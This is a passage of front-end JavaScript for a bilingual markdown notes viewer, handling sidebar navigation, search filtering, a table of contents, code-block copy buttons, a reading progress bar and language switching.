        loadNote(path);

        // Update Active State
        document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
        a.classList.add('active');
    });

    link.appendChild(a);
    navTree.appendChild(link);
}

// -------------------------------------------------------------------------
// UI ENHANCEMENTS (Mac-Style Code & Mobile Menu)
// -------------------------------------------------------------------------

function enhanceCodeBlocks() {
    const codeBlocks = document.querySelectorAll('pre');
    codeBlocks.forEach(pre => {
        // Avoid double enhancement
        if (pre.parentElement.classList.contains('code-wrapper')) return;

        // Create wrapper
        const wrapper = document.createElement('div');
        wrapper.className = 'code-wrapper';

        // Create header
        const header = document.createElement('div');
        header.className = 'code-header';

        // Mac buttons
        const buttons = document.createElement('div');
        buttons.className = 'mac-buttons';
        buttons.innerHTML = `
            <div class="mac-btn red"></div>
            <div class="mac-btn yellow"></div>
            <div class="mac-btn green"></div>
        `;

        // Copy button
        const copyBtn = document.createElement('button');
        copyBtn.className = 'copy-btn';
        copyBtn.textContent = 'Copy';
        copyBtn.onclick = () => {
            const code = pre.querySelector('code').innerText;
            navigator.clipboard.writeText(code).then(() => {
                copyBtn.textContent = 'Copied!';
                setTimeout(() => copyBtn.textContent = 'Copy', 2000);
            });
        };

        header.appendChild(buttons);
        header.appendChild(copyBtn);

        // Assemble
        pre.parentNode.insertBefore(wrapper, pre);
        wrapper.appendChild(header);
        wrapper.appendChild(pre);
    });
}

// Mobile Menu Logic
const mobileMenuBtn = document.getElementById('mobile-menu-btn');
const sidebar = document.querySelector('.sidebar');

if (mobileMenuBtn) {
    mobileMenuBtn.addEventListener('click', (e) => {
        e.stopPropagation();
        sidebar.classList.toggle('active');
    });

    // Close sidebar when clicking outside
    document.addEventListener('click', (e) => {
        if (window.innerWidth <= 768 &&
            sidebar.classList.contains('active') &&
            !sidebar.contains(e.target) &&
            e.target !== mobileMenuBtn) {
            sidebar.classList.remove('active');
        }
    });
}

// -------------------------------------------------------------------------
// PHASE 2: SEARCH & TOC LOGIC
// -------------------------------------------------------------------------

// Search Logic
const searchInput = document.getElementById('search-input');
if (searchInput) {
    searchInput.addEventListener('input', (e) => {
        const query = e.target.value.toLowerCase().trim();
        const navItems = document.querySelectorAll('.nav-item');
        const groupTitles = document.querySelectorAll('.nav-group-title');

        navItems.forEach(item => {
            const text = item.textContent.toLowerCase();
            if (text.includes(query)) {
                item.style.display = ''; // Reset to default
            } else {
                item.style.display = 'none';
            }
        });

        // Hide empty groups
        groupTitles.forEach(title => {
            let next = title.nextElementSibling;
            let hasVisibleChildren = false;

            while (next && !next.classList.contains('nav-group-title')) {
                if (next.classList.contains('nav-item') && next.style.display !== 'none') {
                    hasVisibleChildren = true;
                    break;
                }
                next = next.nextElementSibling;
            }

            if (hasVisibleChildren) {
                title.style.display = '';
            } else {
                title.style.display = 'none';
            }
        });
    });
}

// Table of Contents Logic
function generateTOC() {
    const tocNav = document.getElementById('toc-nav');
    if (!tocNav) return;

    tocNav.innerHTML = '';
    const headers = contentArea.querySelectorAll('h2, h3');

    if (headers.length === 0) {
        tocNav.innerHTML = '<p style="color: var(--text-secondary); font-size: 0.8rem;">No sections</p>';
        return;
    }

    headers.forEach((header, index) => {
        // Assign ID if missing
        if (!header.id) {
            header.id = `section-${index}`;
        }

        const link = document.createElement('a');
        link.href = `#${header.id}`;
        link.textContent = header.textContent;
        link.className = header.tagName === 'H3' ? 'toc-h3' : 'toc-h2';

        link.addEventListener('click', (e) => {
            e.preventDefault();
            header.scrollIntoView({ behavior: 'smooth' });
        });

        tocNav.appendChild(link);
    });

    // ScrollSpy for TOC
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                document.querySelectorAll('#toc-nav a').forEach(l => l.classList.remove('active'));
                const activeLink = document.querySelector(`#toc-nav a[href="#${entry.target.id}"]`);
                if (activeLink) activeLink.classList.add('active');
            }
        });
    }, { rootMargin: '-100px 0px -60% 0px' });

    headers.forEach(header => observer.observe(header));
}

// Reading Progress Bar
const progressBar = document.getElementById('reading-progress');
if (progressBar) {
    contentArea.addEventListener('scroll', () => {
        const scrollTop = contentArea.scrollTop;
        const scrollHeight = contentArea.scrollHeight - contentArea.clientHeight;
        const scrolled = (scrollTop / scrollHeight) * 100;
        progressBar.style.width = `${scrolled}%`;
    });
}

// Load Note Content
function loadNote(filePath) {
    currentFilePath = filePath;
    try {
        contentArea.innerHTML = '<p>Cargando...</p>';

        // Fetch from embedded data
        const markdown = notesData[currentLang][filePath];

        if (!markdown) {
            throw new Error(`Nota no encontrada: ${filePath}`);
        }

        // Render Markdown
        contentArea.innerHTML = marked.parse(markdown);

        // Re-run highlight.js
        hljs.highlightAll();

        // Enhance UI (Mac-style blocks)
        enhanceCodeBlocks();

        // Generate TOC
        generateTOC();

        // Reset Scroll & Progress
        contentArea.scrollTop = 0;
        if (progressBar) progressBar.style.width = '0%';

        // Handle internal links
        document.querySelectorAll('.markdown-body a').forEach(link => {
            const href = link.getAttribute('href');
            if (href && href.endsWith('.md') && !href.startsWith('http')) {
                link.addEventListener('click', (e) => {
                    e.preventDefault();

                    // Simple path resolution for this flat structure
                    // We assume the href matches a key in notesData
                    let targetPath = href;

                    // Handle "Back to Top" special case
                    if (href === 'README.md') {
                        targetPath = 'README.md';
                    }

                    console.log(`Navigating: ${filePath} -> ${targetPath}`);

                    if (notesData[currentLang][targetPath]) {
                        loadNote(targetPath);

                        // Update Sidebar Active State
                        document.querySelectorAll('.nav-link').forEach(l => {
                            l.classList.remove('active');
                            if (l.dataset.path === targetPath) l.classList.add('active');
                        });
                    } else {
                        // Try to find relative path if needed, but for now alert
                        alert(`Nota no encontrada: ${targetPath}`);
                    }
                });
            } else if (href && href.startsWith('#')) {
                // Handle anchor links
                link.addEventListener('click', (e) => {
                    e.preventDefault();
                    const targetId = href.substring(1);
                    const targetElement = document.getElementById(targetId);
                    if (targetElement) {
                        targetElement.scrollIntoView({ behavior: 'smooth' });
                    }
                });
            }
        });

        // Render "Next Section" Link
        const nextNote = findNextNote(filePath);
        if (nextNote) {
            const nextLinkContainer = document.createElement('div');
            nextLinkContainer.className = 'next-section-container';
            nextLinkContainer.innerHTML = `
                <hr>
                <a href="#" class="next-section-link" data-path="${nextNote.path}">
                    <span class="next-label">${uiTranslations[currentLang].next}:</span>
                    <span class="next-title">${nextNote.title}</span>
                    <span class="next-arrow">→</span>
                </a>
            `;

            nextLinkContainer.querySelector('a').addEventListener('click', (e) => {
                e.preventDefault();
                loadNote(nextNote.path);

                // Update Sidebar Active State
                document.querySelectorAll('.nav-link').forEach(l => {
                    l.classList.remove('active');
                    if (l.dataset.path === nextNote.path) l.classList.add('active');
                });

                // Scroll to top
                contentArea.scrollTop = 0;
            });

            contentArea.appendChild(nextLinkContainer);
        }

        // Mobile: Close sidebar on navigation
        if (window.innerWidth <= 768) {
            sidebar.classList.remove('active');
        }

    } catch (error) {
        console.error('Error loading note:', error);
        contentArea.innerHTML = `
            <div class="markdown-alert markdown-alert-caution">
                <span class="markdown-alert-title">ERROR</span>
                No se pudo cargar la nota.<br>
                Detalles: ${error.message}
            </div>
        `;
    }
}

// Init
renderSidebar();
// Load README by default
loadNote('README.md');

// Helper: Resolve relative paths
function resolvePath(fromDir, relativePath) {
    const parts = fromDir.split('/').filter(p => p);
    const relParts = relativePath.split('/');

    for (const part of relParts) {
        if (part === '.') continue;
        if (part === '..') {
            parts.pop();
        } else {
            parts.push(part);
        }
    }
    return parts.join('/');
}

// Helper: Find next note
function findNextNote(currentPath) {
    const flatList = [];
    notesStructure.forEach(item => {
        if (item.children) {
            item.children.forEach(child => flatList.push(child));
        } else {
            flatList.push(item);
        }
    });

    const currentIndex = flatList.findIndex(item => item.path === currentPath);
    if (currentIndex !== -1 && currentIndex < flatList.length - 1) {
        return flatList[currentIndex + 1];
    }
    return null;
}

document.getElementById('lang-select').addEventListener('change', (e) => {
    currentLang = e.target.value;

    // Refresh UI
    const welcomeTitle = document.querySelector('.welcome-screen h2');
    const welcomeP = document.querySelector('.welcome-screen p');
    if (welcomeTitle) {
        welcomeTitle.textContent = uiTranslations[currentLang].welcome;
        welcomeP.textContent = uiTranslations[currentLang].nav_hint;
    }

    // Update Next Link Label if it exists
    const nextLabel = document.querySelector('.next-label');
    if (nextLabel) {
        nextLabel.textContent = uiTranslations[currentLang].next + ":";
    }

    // Update Sidebar
    renderSidebar();

    // Refresh current note content
    loadNote(currentFilePath);
});
